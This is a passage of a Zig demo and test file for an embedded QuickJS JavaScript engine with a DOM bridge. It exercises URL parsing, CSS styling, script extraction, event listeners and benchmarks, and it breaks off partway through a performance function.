const std = @import("std");
const builtin = @import("builtin");
const z = @import("root.zig");
const zqjs = z.wrapper;
const event_loop_mod = @import("event_loop.zig");
const EventLoop = event_loop_mod.EventLoop;
const DOMBridge = z.dom_bridge.DOMBridge;
const RCtx = @import("runtime_context.zig").RuntimeContext;
const utils = @import("utils.zig");
const ScriptEngine = @import("script_engine.zig").ScriptEngine;
const parseCSV = @import("csv_parser.zig");

const AsyncTask = event_loop_mod.AsyncTask;
const AsyncBridge = @import("async_bridge.zig");
// const NativeBridge = @import("js_native_bridge.zig");
const Pt = @import("js_Point.zig");
const Pt2 = @import("Point2.zig");
const JSWorker = @import("js_worker.zig");
const js_consoleLog = @import("utils.zig").js_consoleLog;
const Reflect = @import("reflection.zig");
const Mocks = @import("dom_mocks.zig");

const native_os = builtin.os.tag;
pub var app_should_quit = std.atomic.Value(bool).init(false);

// toggle the flag
fn handleSigInt(_: c_int) callconv(.c) void {
    app_should_quit.store(true, .seq_cst);
}
// Setup function to call at start of main()
pub fn setupSignalHandler() void {
    if (builtin.os.tag == .windows) {
        // Windows needs a different approach (SetConsoleCtrlHandler),
        // but for now we focus on POSIX (Linux/macOS) as requested.
        return;
    }

    const act = std.posix.Sigaction{
        .handler = .{ .handler = handleSigInt },
        .mask = std.posix.sigemptyset(),
        .flags = 0,
    };

    // Catch Ctrl+C (SIGINT)
    std.posix.sigaction(std.posix.SIG.INT, &act, null);
    // Optional: Catch Termination request (SIGTERM)
    std.posix.sigaction(std.posix.SIG.TERM, &act, null);
}

fn setupAllocator() std.mem.Allocator {
    var debug_allocator: std.heap.DebugAllocator(.{}) = .init;
    const c_alloc = std.heap.c_allocator;
    defer _ = debug_allocator.deinit();
    return switch (builtin.mode) {
        .Debug, .ReleaseSafe => debug_allocator.allocator(),
        .ReleaseFast, .ReleaseSmall => c_alloc,
    };
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const sandbox_root = try std.fs.cwd().realpathAlloc(allocator, ".");
    defer allocator.free(sandbox_root);

    setupSignalHandler();

    // try mock_class(allocator, sandbox_root);
    try urlObject(allocator, sandbox_root);
    try inline_crud_css_js(allocator, sandbox_root);
    try stylesheet_txt(allocator, sandbox_root);
    try stylesheet_style_tag(allocator, sandbox_root);
    try link_and_script(allocator, sandbox_root);

    try extractScript(allocator, sandbox_root);

    try simpleESM(allocator, sandbox_root);
    // try importModule(allocator);
    // try js_framework_1_bench(allocator);
    // try js_framework_2_bench(allocator);
    // try js_framework_3_bench(allocator);
    // try bench(allocator);

    try eventListeners(allocator, sandbox_root);

    // try transplante(allocator);
    // try fullCycle(allocator);
    // // try customPointClass(allocator);
    // // try demoPoint2Class(allocator);
    // try domParser(allocator);
    // try buildDOM(allocator);

    // try eventListener(allocator);
    // // try performance2(allocator);
    // // // try demoCustomPointClass(allocator);
    // // // try demoPoint2Class(allocator); // TODO: Fix ClassBuilder segfault
    // try first_QuickJS_test(allocator);
    // try getValueFromQJSinZig(allocator);

    // try test_event_loop(allocator);
    // try promise_scope(allocator);
    // try async_task_sequence_AB(allocator);
    // try async_task_sequence_ABCDEFGH(allocator);
    try execute_Simple_Script_In_HTML(allocator);
    try execute_async_Script_in_HTML_And_pass_To_Zig(allocator, sandbox_root);
    try async_Script_and_pass_to_Zig(allocator, sandbox_root);
    // try execute_Passing_Binary_Data_from_Zig_to_JS_Async(allocator);
    // try firstJSONPass(allocator);
    // try simplifiedJSONPass(allocator);
    // try JS_Proxy_And_Generators(allocator);
    try async_Fetch_Blob(allocator, sandbox_root);
    try async_Fetch_API_Demo(allocator, sandbox_root);
    try uploadFile(allocator, sandbox_root);
    // try async_CSV_JSON_Parser(allocator, sandbox_root);
    // try async_CSV_Tuple_Parser(allocator, sandbox_root);

    // try demoWorker(allocator, sandbox_root);
    // try test_dom_purify(allocator, sandbox_root);

    // // lexb =====

    // try simpleParsingsMethods(allocator);
    // try demoNormalizer(allocator);
    // try demoTemplate(allocator);
    // try demoParserReUse(allocator);
    // try demoStreamParser(allocator);
    // try demoInsertAdjacentElement(allocator);
    // try demoInsertAdjacentHTML(allocator);
    // try demoSetInnerHTML(allocator);
    // try demoSuspiciousAttributes(allocator);
}

// fn mock_class(allocator: std.mem.Allocator, sbx: []const u8) !void {
//     const engine = try ScriptEngine.init(allocator, sbx);
//     defer engine.deinit();

//     // 2. Register the Hierarchy
//     // The order matters slightly: Base classes first is safer for internal lookups,
//     // though the registry handles lazy lookup if implemented carefully.
//     const DomBinder = Reflect.reflect(.{ Mocks.Node, Mocks.HTMLElement, Mocks.Document });
//     try DomBinder.install(engine.ctx);

//     z.print("\n=== Testing Reflection Inheritance --------------------------\n", .{});

//     const script =
//         \\ // 1. Instantiate HTMLElement
//         \\ const div = new HTMLElement("DIV");
//         \\
//         \\ console.log("Is HTMLElement?", div instanceof HTMLElement); // true
//         \\ console.log("Is Node?", div instanceof Node);             // true (Inheritance works!)
//         \\
//         \\ // 2. Call Child Method
//         \\ div.click();
//         \\
//         \\ // 3. Call Base Method (inherited from Node)
//         \\ // Note: Our simple mock requires manual delegation in C-land usually,
//         \\ // but since we mapped prototypes, JS looks up the chain.
//         \\ // However, 'this' will be an HTMLElement*, but Node methods expect Node*.
//         \\ // *See note below on Pointer Casting*
//         \\ console.log("Node Name:", div.toString());
//         \\
//         \\ // 4. Document
//         \\ const doc = new Document("http://localhost");
//         \\ console.log("Doc URL:", doc.URL);
//         \\ console.log("Doc NodeName:", doc.toString());
//     ;

//     _ = try engine.eval(script, "test.js", .global);
//     try engine.run();
//     // Reflect.deinit();
//     // engine.deinit();
// }

fn urlObject(allocator: std.mem.Allocator, sbx: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    const js =
        \\console.log("=== URL Parsing & Getters ===");
        \\const url = new URL("https://user:pass@example.com:8080/api/v1?key=value&foo=bar#section");
        \\
        \\console.log("Full URL:", url.toString());
        \\console.log("  protocol:", url.protocol);
        \\console.log("  username:", url.username);
        \\console.log("  password:", url.password);
        \\console.log("  hostname:", url.hostname);
        \\console.log("  port:", url.port);
        \\console.log("  pathname:", url.pathname);
        \\console.log("  search:", url.search);
        \\console.log("  hash:", url.hash);
        \\
        \\console.log("\n=== URL with Base (Relative Parsing) ===");
        \\const base = new URL("https://example.org/foo/");
        \\const relative = new URL("../bar?test=1", base);
        \\console.log("Relative URL:", relative.toString());
        \\console.log("  pathname:", relative.pathname);
        \\console.log("  hostname:", relative.hostname);
        \\
        \\console.log("\n=== URLSearchParams - Construction & Basic Methods ===");
        \\const params = new URLSearchParams("key=value&a=b&key=duplicate");
        \\console.log("Initial:", params.toString());
        \\console.log("  get('key'):", params.get("key"));  // Returns first value
        \\console.log("  has('a'):", params.has("a"));
        \\console.log("  has('missing'):", params.has("missing"));
        \\
        \\console.log("\n=== URLSearchParams - Append, Set, Delete ===");
        \\params.append("new", "123");
        \\console.log("After append('new', '123'):", params.toString());
        \\
        \\params.set("key", "updated");  // Replaces all 'key' values
        \\console.log("After set('key', 'updated'):", params.toString());
        \\
        \\params.delete("a");
        \\console.log("After delete('a'):", params.toString());
        \\
        \\console.log("\n=== URLSearchParams - Sort ===");
        \\const unsorted = new URLSearchParams("z=last&a=first&m=middle");
        \\console.log("Before sort:", unsorted.toString());
        \\unsorted.sort();
        \\console.log("After sort:", unsorted.toString());
        \\
        \\console.log("\n=== URLSearchParams - Strip Leading '?' ===");
        \\const withQuestion = new URLSearchParams("?foo=bar&baz=qux");
        \\console.log("From '?foo=bar&baz=qux':", withQuestion.toString());
        \\
        \\console.log("\n=== URL with Different Host Types ===");
        \\const ipv4 = new URL("http://192.168.1.1:3000/test");
        \\console.log("IPv4 hostname:", ipv4.hostname);
        \\
        \\const domain = new URL("https://subdomain.example.org/api");
        \\console.log("Domain hostname:", domain.hostname);
        \\
        \\console.log("\n=== Headers API ===");
        \\const headers = new Headers({
        \\  "Content-Type": "application/json",
        \\  "X-Custom-Header": "test-value"
        \\});
        \\console.log("  has('content-type'):", headers.has('content-type'));
        \\console.log("  get('content-type'):", headers.get('content-type'));
        \\console.log("  get('x-custom-header'):", headers.get('x-custom-header'));
        \\
        \\headers.set('Authorization', 'Bearer token123');
        \\console.log("  After set Authorization:", headers.get('authorization'));
        \\
        \\headers.append('Cache-Control', 'no-cache');
        \\console.log("  After append Cache-Control:", headers.get('cache-control'));
        \\
        \\headers.delete('x-custom-header');
        \\console.log("  After delete x-custom-header:", headers.has('x-custom-header'));
        \\
        \\console.log("\n✅ All URL & URLSearchParams tests passed!");
    ;
    const val = try engine.eval(js, "url-test.js", .global);
    defer engine.ctx.freeValue(val);
}

fn inline_crud_css_js(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== CSS-in-JS:1 with INLINE styles--------------------------------\n\n", .{});
    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    // with inline styles
    try engine.loadHTML(
        \\<html><body><div id="box" style="color: red;"></div></body></html>
        \\
    );

    const script =
        \\ const div = document.getElementById('box');
        \\ console.log("Div found:", div.tagName);
        // inline style access
        \\ const div_style = div.style;
        \\ const color_str = div_style.getPropertyValue('color');
        \\ div_style.setProperty('width', '100px');
        \\ const width_str = div_style.getPropertyValue('width');
        \\ console.log(width_str);
        \\ div_style.setProperty('font-size', '16px');
        \\ console.log("Font size set to:", div_style.getPropertyValue('font-size'));
        \\ div_style.removeProperty('font-size');
        \\ ({color: color_str, width: width_str});
    ;
    const result = try engine.eval(script, "test.js", .global);
    defer engine.ctx.freeValue(result);

    const color_val = engine.ctx.getPropertyStr(result, "color");
    defer engine.ctx.freeValue(color_val);
    const color_str = try engine.ctx.toZString(color_val);
    defer engine.ctx.freeZString(color_str);

    const width_val = engine.ctx.getPropertyStr(result, "width");
    defer engine.ctx.freeValue(width_val);
    const width_str = try engine.ctx.toZString(width_val);
    defer engine.ctx.freeZString(width_str);

    try std.testing.expectEqualStrings("red", color_str);
    try std.testing.expectEqualStrings("100px", width_str);
}

fn stylesheet_txt(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== CSS-in-JS:1 with 'external' parse|attach_Stylesheet() --------------------------------\n\n", .{});

    const html =
        \\<p id="pid">Some text</p>
        \\<form>
        \\  <button type="button">Change text</button>
        \\</form>
    ;
    const css =
        \\#pid {
        \\  color: green;
        \\  font-size: 20px;
        \\}
    ;

    const js =
        \\function changeText() {
        \\  const p = document.getElementById("pid")
        \\  p.textContent = "New text"
        \\  p.style.setProperty('color', "red");
        \\  p.style.setProperty('font-size', "30px");
        \\}
        \\const btn = document.querySelector("button");
        \\btn.addEventListener("click", () => {
        \\  changeText();
        \\});
        \\
        \\ btn.dispatchEvent(new Event('click'), (e) => {
        \\  console.log("Button clicked");
        \\});
    ;

    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    const bridge = engine.dom;
    try engine.loadHTML(html);

    try z.parseStylesheet(bridge.stylesheet, bridge.css_style_parser, css);
    try z.attachStylesheet(bridge.doc, bridge.stylesheet);

    const val = try engine.eval(js, "style_test.js", .module);
    defer engine.ctx.freeValue(val);

    const p_el = z.getElementById(bridge.doc, "pid").?;

    const computed_color = try z.getComputedStyle(allocator, p_el, "color");
    const computed_font_size = try z.getComputedStyle(allocator, p_el, "font-size");
    defer if (computed_color) |c| allocator.free(c);
    defer if (computed_font_size) |c| allocator.free(c);

    try std.testing.expectEqualStrings("red", computed_color.?);
    try std.testing.expectEqualStrings("30px", computed_font_size.?);

    try z.printDOM(allocator, engine.dom.doc, "CSS external");
}

fn stylesheet_style_tag(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== CSS-in-JS:2 with <style>Stylesheet --------------------------------\n\n", .{});
    const html =
        \\<html>
        \\  <head>
        \\    <style>
        \\      #pid {  color: green;  font-size: 20px; }
        \\    </style>
        \\  </head>
        \\  <body>
        \\      <p id="pid">Some text</p>
        \\      <form>
        \\          <button type="button">Change text</button>
        \\      </form>
        \\  </body>
        \\</html>
    ;

    const js =
        \\function changeText() {
        \\  const p = document.getElementById("pid")
        \\  p.textContent = "New text"
        \\}
        \\const btn = document.querySelector("button");
        \\btn.addEventListener("click", () => {
        \\  changeText();
        \\});
        \\
        \\ btn.dispatchEvent(new Event('click'), (e) => {
        \\  console.log("Button clicked");
        \\});
    ;

    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();
    const bridge = engine.dom;
    try engine.loadHTML(html);
    const val = try engine.eval(js, "style_test.js", .module);
    defer engine.ctx.freeValue(val);

    const p_el = z.getElementById(bridge.doc, "pid").?;

    const computed_color = try z.getComputedStyle(allocator, p_el, "color");
    const computed_font_size = try z.getComputedStyle(allocator, p_el, "font-size");
    defer if (computed_color) |c| allocator.free(c);
    defer if (computed_font_size) |c| allocator.free(c);

    try std.testing.expectEqualStrings("green", computed_color.?);
    try std.testing.expectEqualStrings("20px", computed_font_size.?);
    try std.testing.expectEqualStrings("New text", z.textContent_zc(z.elementToNode(p_el)));
    try z.printDOM(allocator, engine.dom.doc, "CSS with <style> element");
}

fn link_and_script(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== CSS-in-JS:3 <script> anad <link> with 'external' file --------------------------------\n\n", .{});
    const html =
        \\<html>
        \\  <head>
        \\    <link rel="stylesheet" href="style.css">
        \\  </head>
        \\  <body>
        \\      <p id="pid">Some text</p>
        \\      <form>
        \\          <button type="button">Change text</button>
        \\      </form>
        \\      <script type="module" src="main.js"></script>
        \\  </body>
        \\</html>
    ;

    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();
    const bridge = engine.dom;
    try engine.loadHTML(html);
    try engine.loadExternalStylesheets("js/js-and-css/");
    try engine.executeScripts(allocator, "js/js-and-css");
    try engine.run();

    const p_el = z.getElementById(bridge.doc, "pid").?;

    const computed_color = try z.getComputedStyle(allocator, p_el, "color");
    const computed_font_size = try z.getComputedStyle(allocator, p_el, "font-size");

    defer if (computed_color) |c| allocator.free(c);
    defer if (computed_font_size) |c| allocator.free(c);

    // try std.testing.expectEqualStrings("green", computed_color.?);
    // try std.testing.expectEqualStrings("20px", computed_font_size.?);
    // try std.testing.expectEqualStrings("New text", z.textContent_zc(z.elementToNode(p_el)));

    z.print("[Zig] p_color: {s}, p_font_size: {s}\n", .{ computed_color.?, computed_font_size.? });

    try z.printDOM(allocator, engine.dom.doc, "link-stylesheet and Script with 'external' file");
}

fn js_framework_1_bench(allocator: std.mem.Allocator) !void {
    var engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== JS-framework-1 --------------------------------\n\n", .{});

    const start = std.time.nanoTimestamp();

    const html_file = try std.fs.cwd().openFile("js/js-fram-1/index.html", .{});
    defer html_file.close();
    const html = try html_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(html);

    try engine.loadHTML(html);

    const code_file = try std.fs.cwd().openFile("js/js-fram-1/js-vanilla-bench1.js", .{});
    defer code_file.close();
    const code = try code_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(code);
    const c_code = try allocator.dupeZ(u8, code);
    defer allocator.free(c_code);

    const val = try engine.eval(c_code, "bench_script", .global);
    engine.ctx.freeValue(val);

    // const clicker_js = @embedFile("../js/js-fram/clicker.js");
    // The click script <-- needs to be in "/src" to work
    const clicker_file = try std.fs.cwd().openFile("js/js-fram-1/clicker.js", .{});
    defer clicker_file.close();
    const clicker_js = try clicker_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(clicker_js);
    const clicker_c_code = try allocator.dupeZ(u8, clicker_js);
    defer allocator.free(clicker_c_code);
    const clicker = try engine.eval(clicker_c_code, "clicker.js", .global);
    engine.ctx.freeValue(clicker);

    const end = std.time.nanoTimestamp();
    const ms = @divFloor(end - start, 1_000);
    std.debug.print("\n⚡️ Zig Engine Time: {d}ns\n\n", .{ms});
}

fn js_framework_2_bench(allocator: std.mem.Allocator) !void {
    var engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== JS-framework-2 --------------------------------\n\n", .{});

    const start = std.time.nanoTimestamp();

    const html_file = try std.fs.cwd().openFile("js/js-fram-2/index.html", .{});
    defer html_file.close();
    const html = try html_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(html);

    try engine.loadHTML(html);
    const code_file = try std.fs.cwd().openFile("js/js-fram-2/js-vanilla-bench2.js", .{});
    defer code_file.close();
    const code = try code_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(code);

    // const c_code = try allocator.dupeZ(u8, code);
    // defer allocator.free(c_code);
    const val = try engine.eval(code, "bench_script", .global);
    engine.ctx.freeValue(val);

    // const driver_js = @embedFile("../js/js-fram/driver.js");
    // The click script <-- needs to be in "/src" to work
    const driver_file = try std.fs.cwd().openFile("js/js-fram-2/clicker.js", .{});
    defer driver_file.close();
    const driver_js = try driver_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(driver_js);
    // const driver_c_code = try allocator.dupeZ(u8, driver_js);
    // defer allocator.free(driver_c_code);
    const driver = try engine.eval(driver_js, "driver.js", .global);
    engine.ctx.freeValue(driver);

    const end = std.time.nanoTimestamp();
    const ns = @divFloor(end - start, 1_000_000);

    std.debug.print("\n⚡️ Zig Engine Time: {d}ms\n", .{ns});
}

fn js_framework_3_bench(allocator: std.mem.Allocator) !void {
    var engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== JS-framework-3 --------------------------------\n\n", .{});

    const start = std.time.nanoTimestamp();

    const html_file = try std.fs.cwd().openFile("js/js-fram-3/index.html", .{});
    defer html_file.close();
    const html = try html_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(html);

    try engine.loadHTML(html);
    const code_file = try std.fs.cwd().openFile("js/js-fram-3/js-vanilla-bench3.js", .{});
    defer code_file.close();
    const code = try code_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(code);

    // const c_code = try allocator.dupeZ(u8, code);
    // defer allocator.free(c_code);
    const val = try engine.eval(code, "bench_script", .global);
    engine.ctx.freeValue(val);

    const clicker_file = try std.fs.cwd().openFile("js/js-fram-3/clicker.js", .{});
    defer clicker_file.close();
    const clicker_js = try clicker_file.readToEndAlloc(allocator, 1024 * 10);
    defer allocator.free(clicker_js);

    // const clicker_js = @embedFile("../js/js-fram/clicker.js");
    // The click script <-- needs to be in "/src" to work

    // const clicker_c_code = try allocator.dupeZ(u8, clicker_js);
    // defer allocator.free(clicker_c_code);
    const clicker = try engine.eval(clicker_js, "clicker.js", .global);
    engine.ctx.freeValue(clicker);

    const end = std.time.nanoTimestamp();
    const ns = @divFloor(end - start, 1_000_000);

    std.debug.print("\n⚡️ Zig Engine Time: {d}ms\n", .{ns});
}
fn bench(allocator: std.mem.Allocator) !void {
    var engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== JS-simple-bench --------------------------------\n\n", .{});

    const start = std.time.nanoTimestamp();
    // const file = try std.fs.cwd().openFile("src/bench.html", .{});
    // defer file.close();
    // const html = try file.readToEndAlloc(allocator, 1024);
    const html = @embedFile("bench.html");
    // defer allocator.free(html);

    try engine.loadHTML(html);

    const c_scripts = try engine.getC_Scripts();
    defer {
        for (c_scripts) |code| allocator.free(code);
        allocator.free(c_scripts);
    }

    for (c_scripts) |code| {
        // const c_code = try allocator.dupeZ(u8, code);
        // defer allocator.free(c_code);
        const val = engine.eval(code, "bench_script", .global) catch |err| {
            std.debug.print("Script Error: {}\n", .{err});
            return err;
        };
        engine.ctx.freeValue(val);
    }

    const end = std.time.nanoTimestamp();
    const ms = @divFloor(end - start, 1_000_000);
    std.debug.print("\n⚡️ Zig Engine Time: {d}ms\n\n", .{ms});
}

fn extractScript(allocator: std.mem.Allocator, sbx: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Extract Script from HTML --------------------------------\n\n", .{});

    const html =
        \\<!DOCTYPE html>
        \\<html>
        \\<body>
        \\  <h1>Test</h1>
        \\
        \\  <script>
        \\    function greet(name) {
        \\      return `Hello, ${name}!`;
        \\    }
        \\  </script>
        \\
        \\  <script>var a = 10;</script>
        \\
        \\  <div id="ignore"></div>
        \\
        \\  <script src="jquery.js"></script>
        \\
        \\  <script>
        \\      var b = a + 20; 
        \\      console.log("[JS] Result: ", b);
        \\      console.log("[JS] Evaluate 'greet': ", greet('Zig'));
        \\      b;
        \\  </script>
        \\</body>
        \\</html>
    ;
    try engine.loadHTML(html);
    try engine.executeScripts(allocator, "");
}

fn eventListener(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();
    z.print("\n=== DOM Event Listener Demo -------------------------\n\n", .{});

    const source = try std.fs.cwd().readFileAlloc(allocator, "js/event_loop_event_listener_and_reactive.js", 1024 * 10);
    defer allocator.free(source);
    const c_source = try allocator.dupeZ(u8, source);
    defer allocator.free(c_source);

    const val = try engine.evalModule(c_source, "dom_event_listener.js");
    if (z.isException(val)) {
        const exception_val = z.qjs.JS_GetException(engine.ctx.ptr);
        defer z.qjs.JS_FreeValue(engine.ctx.ptr, exception_val);

        // Print the error stack trace to stderr
        // (Assuming you have a helper or manual extraction)
        // const str = z.wrapper.Context{ .ptr = engine.ctx.ptr };
        const ctx_str = engine.ctx.toCString(exception_val) catch "Unknown Error";
        std.debug.print("❌ JS Error: {s}\n", .{ctx_str});
        // Note: Real QuickJS error printing usually involves getting the 'stack' property too.
    } else {
        const state = z.qjs.JS_PromiseState(engine.ctx.ptr, val);

        if (state == z.qjs.JS_PROMISE_REJECTED) {
            const reason = z.qjs.JS_PromiseResult(engine.ctx.ptr, val);

            defer z.qjs.JS_FreeValue(engine.ctx.ptr, reason);

            const str = engine.ctx.toCString(reason) catch "Unknown Error";
            defer engine.ctx.freeCString(str);
            std.debug.print("❌ Module Promise Rejected: {s}\n", .{str});
        } else {
            z.print("[Zig] Script executed successfully (Promise Pending/Resolved).\n", .{});
        }
    }
    engine.ctx.freeValue(val);

    // Run Main Loop (Handles Events)
    try engine.run();

    const body_node = z.documentRoot(engine.dom.doc);
    try z.prettyPrint(allocator, body_node.?);
}

fn eventListeners(allocator: std.mem.Allocator, sbx: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Async Event listeners --------------------------------\n\n", .{});

    try engine.loadHTML(
        \\<body>
        \\  <button id="my-btn">Click Me</button>
        \\  <div id="result">Waiting...</div>
        \\</body>
    );

    const script =
        \\ const btn = document.getElementById('my-btn');
        \\ const result = document.getElementById('result');
        \\ function cb(e) {
        \\    console.log("[JS]: Click received " + e.type + " on " + e.target.tagName + " " + e.target.id);
        \\    result.textContent = "Clicked (Sync)";
        \\
        \\    setTimeout(() => {
        \\         console.log("[JS]: Timeout fired!");
        \\          // should return to Zig after this line
        \\         result.textContent = "Clicked (Async)";
        \\     }, 10);
        \\}
        \\ btn.addEventListener('click', cb);
        \\
        \\ // Trigger the event from JS (new Event form and string form)
        \\
        \\ console.log("[JS]: Dispatching click...");
        \\ btn.dispatchEvent(new Event('click'));
        \\ btn.dispatchEvent('click'); // also works
        \\ btn.removeEventListener('click', cb);
        \\ btn.dispatchEvent('click'); // should not trigger anything now
    ;

    // Run the Script: executed parts: dispatch -> handler -> sync update)
    const val = try engine.eval(script, "event_test", .module);
    defer engine.ctx.freeValue(val);

    // Check Synchronous Update
    {
        const result_div = try z.querySelector(allocator, engine.dom.doc, "#result");
        const text = z.textContent_zc(z.elementToNode(result_div.?));

        std.debug.print("[Zig] Check (Sync): {s}\n", .{text});
        try std.testing.expectEqualStrings("Clicked (Sync)", text);
    }

    // Run Event Loop
    try engine.run();

    // Check Asynchronous Update
    {
        const result_div = try z.querySelector(allocator, engine.dom.doc, "#result");
        const text = z.textContent_zc(z.elementToNode(result_div.?));

        std.debug.print("[Zig] Check (Async): {s}\n", .{text});
        try std.testing.expectEqualStrings("Clicked (Async)", text);
    }
}

fn transplante(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== Transplante Demo -------------------------\n\n", .{});

    try engine.loadHTML(
        \\<!DOCTYPE html>
        \\<body>
        \\  <div id="target">Old Text</div>
        \\</body>
    );
    const script =
        \\ const el = document.getElementById("target");
        \\ console.log("Found element:", el.tagName);
        \\ el.textContent = "Updated by JS!";
        \\ el.textContent; // Return this string to Zig
    ;

    const val = try engine.eval(script, "test_script");
    defer engine.ctx.freeValue(val);

    // 3. Verify Result
    const result_str = try engine.ctx.toZString(val);
    defer engine.ctx.freeZString(result_str);

    std.debug.print("Result: {s}\n", .{result_str});
    try std.testing.expectEqualStrings("Updated by JS!", result_str);
}

// // test "Full Cycle: HTML -> JS Execution -> DOM Modification" {
// fn fullCycle(allocator: std.mem.Allocator) !void {
//     const engine = try ScriptEngine.init(allocator);
//     defer engine.deinit();

//     // 1. The Raw HTML (simulating a downloaded web page)
//     // Notice: The HTML is incomplete. The JS is required to finish it.
//     try engine.loadHTML(
//         \\<!DOCTYPE html>
//         \\<html>
//         \\  <body>
//         \\    <div id="app">Loading...</div>
//         \\    <script id="main-script">
//         \\       // This JS runs inside QuickJS
//         \\       const app = document.getElementById("app");
//         \\       app.textContent = "Hydration Complete!";
//         \\
//         \\       const newBtn = document.createElement("button");
//         \\       newBtn.textContent = "Click Me";
//         \\       document.body.appendChild(newBtn);
//         \\       console.log("JS finished running.");
//         \\    </script>
//         \\  </body>
//         \\</html>
//     );

//     const page = try z.parseHTML(allocator, html_src);
//     defer z.destroyDocument(page);

//     // 3. The "Browser Loop": Find and Run Scripts
//     // (This is what your 'zexplorer' logic needs to do)
//     const script_el = try z.querySelector(allocator, page, "script");
//     const js_code = z.textContent_zc(z.elementToNode(script_el.?));
//     const c_code = try allocator.dupeZ(u8, js_code);
//     defer allocator.free(c_code);

//     // A. Extract JS code from DOM
//     // defer allocator.free(js_code);

//     // B. Run it in the Engine!
//     // We need to make sure 'document' in JS points to 'page' in Zig.
//     // Since your current binding hardcodes 'document' to the GLOBAL one,
//     // we must temporarily set the engine's global document to 'page'
//     // OR (better) use your 'owned_document' logic and pass 'page' as 'document' to the script.

//     // Let's assume for this test we update the Engine's global doc pointer:
//     engine.rc.global_document = page;
//     // (You might need to update the opaque pointer in JS global 'document' too if it caches it)

//     // std.debug.print("Executing Script: {s}\n", .{js_code});
//     const val = engine.eval(c_code, "embedded_script") catch |err| {
//         std.debug.print("Script failed: {}\n", .{err});
//         return err;
//     };
//     engine.ctx.freeValue(val);

//     // Check #app text
//     const app_div = try z.querySelector(allocator, page, "#app");
//     const app_text = z.textContent_zc(z.elementToNode(app_div.?));
//     std.debug.print("Final App Text: {s}\n", .{app_text});
//     // try std.testing.expectEqualStrings("Hydration Complete!", app_text);

//     // Check if Button exists
//     const buttons = try z.querySelectorAll(allocator, page, "button");
//     defer allocator.free(buttons);
//     // try std.testing.expect(buttons.len == 1);
// }

fn domParser(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== DOM Parser -------------------------\n\n", .{});

    const script =
        \\ const parser = new DOMParser();
        \\ const pDoc = parser.parseFromString("<!DOCTYPE html><html><body><div id='content'>DOMParser worked</div></body></html>");
        \\ const parserDivContent = pDoc.getElementById("content").textContent;
        \\ console.log("Parsed div content:", parserDivContent);
        \\ console.log("Document body innerHTML:", pDoc.body.innerHTML);
        \\ pDoc.body.innerHTML;
    ;

    const val = try engine.eval(script, "script", .global);
    defer engine.ctx.freeValue(val);
    const html = try engine.ctx.toZString(val);
    defer engine.ctx.freeZString(html);
    z.print("{s}\n", .{html});
    const expected =
        \\<div id="content">DOMParser worked</div>
    ;
    try std.testing.expectEqualStrings(expected, html);
}

fn buildDOM(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    const script =
        \\ const doc = document.parseHTML("<p id='a'>Hello</p>");
        \\ const pElement = doc.getElementById("a");
        \\ console.log("Paragraph #1 textContent:", pElement.textContent);
        \\ const bodyElement = doc.body;
        \\ const div = doc.createElement("div");
        \\ const p = doc.createElement("p");
        \\ p.textContent = "This is a paragraph in a DIV";
        \\ console.log(p.textContent);
        \\ div.appendChild(p);
        \\ bodyElement.appendChild(div);
        \\ const html = bodyElement.innerHTML;
        \\ console.log("[JS] :", html);
        \\html;
    ;

    z.print("\n=== perseHTML -------------------------\n\n", .{});

    const val = try engine.eval(script, "script", .global);
    defer engine.ctx.freeValue(val);
    const result_str = try engine.ctx.toZString(val);
    defer engine.ctx.freeZString(result_str);
    z.print("[Zig]: {s}\n", .{result_str});
    const expect =
        \\<p id="a">Hello</p><div><p>This is a paragraph in a DIV</p></div>
    ;
    try std.testing.expectEqualStrings(expect, result_str);
}

fn performance2(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    const html =
        \\<!DOCTYPE html>
        \\<html>
        \\  <body>
        \\      <script>
        \\          const elt = document.getElementById('content').textContent;
        \\          //document.documentElement.innerHTML;
        \\      </script>
        \\      <div id="content">Original</div>
        \\  </body>
        \\</html>
    ;

    const iterations = 100;

    const start = std.time.nanoTimestamp();

    for (0..iterations) |_| {
        const doc = try z.parseHTML(allocator, html);
        try z.prettyPrint(allocator, z.documentRoot(doc).?);
        defer z.destroyDocument(doc);
        const script = try z.querySelector(allocator, doc, "script");
        // defer allocator.free(script);
        const script_content = z.textContent_zc(z.elementToNode(script.?));
        const c_script = try allocator.dupeZ(u8, script_content);
        defer allocator.free(c_script);
        const val = try engine.eval(c_script, "script");
        defer engine.ctx.freeValue(val);
    }

